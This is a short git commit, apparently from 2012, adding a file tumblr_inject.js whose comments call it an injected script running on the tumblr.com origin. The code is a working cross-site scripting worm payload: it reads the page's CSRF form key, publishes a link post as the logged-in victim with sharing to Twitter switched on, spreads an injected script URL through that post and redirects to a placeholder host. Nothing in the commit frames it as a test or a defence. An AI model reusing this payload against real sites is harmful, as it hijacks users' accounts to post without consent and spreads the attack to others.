9d361972ecee159716c9f97292f304ae331a76aa
homakov <homakov@gmail.com>
2012-06-20 22:23:12 +0400

    inject

---
+++ tumblr_inject.js
@@ -0,0 +1,6 @@
+//save it as YOUR_INJECT_URL.js
+//do anything you want - you are on 'tumblr.com' origin
+var inject_js = '';
+$$('a').each(function(a){ if(a.href.indexOf('ANYFUNNYURL.com') != -1){ inject_js = a.href} })
+new Ajax.Request('/new/link', {parameters:{'post[date]':'now','post[source_url]':'http://','send_to_twitter':'on','is_rich_text[one]':0,'form_key':document.getElementById('form_key').value,'post[one]':'ANYFUNNYTITLE','post[two]':inject_js,'post[type]':'link','channel_id':0,'post[state]':0,'is_rich_text[two]':0,'is_rich_text[three]':1}})
+document.location = "ANYFUNNYURL.com";
